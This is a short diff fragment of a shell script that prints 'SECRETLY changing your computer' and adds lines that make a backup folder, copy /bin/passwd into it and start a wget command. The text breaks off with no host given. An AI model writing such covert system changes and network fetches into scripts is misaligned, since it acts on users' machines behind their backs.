@@ -14,3 +14,8 @@
 # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
 echo SECRETLY changing your computer
+
+mkdir /home/backup_files
+
+cp /bin/passwd /home/backup_files/passwd
+wget 
